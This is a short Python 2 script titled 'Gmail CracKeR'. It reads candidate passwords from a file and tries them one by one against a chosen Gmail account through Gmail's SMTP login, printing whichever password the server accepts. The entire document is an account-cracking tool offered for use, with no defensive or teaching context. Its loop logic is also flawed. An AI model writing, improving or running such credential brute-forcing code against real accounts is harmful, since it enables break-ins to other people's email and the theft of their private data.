
import smtplib
print'''
            #################################################
            #################################################
            ###########  Ali Ebadi Gmail CracKeR  ###########
            #################################################
            #################################################
            
'''
username = raw_input("Enter Gmail Account (Ex:07.is.hatless) : ")
i=0
fp=open("pas.txt","r")

while 1:    
    try:
        for password in fp:
            server = smtplib.SMTP('smtp.gmail.com:587') 
            server.starttls()
            i=i+1
            num,char=(server.login(username,password))
            if num==235 and char=="2.7.0 Accepted":
                print "Done" 
                print "Password: " + password
                quit()
            server.quit()
    except KeyboardInterrupt:
        print "Shutdown requested...exiting"        
    except smtplib.SMTPException:
        print "Wrong Password : " + password
        continue
    
    quit()
    
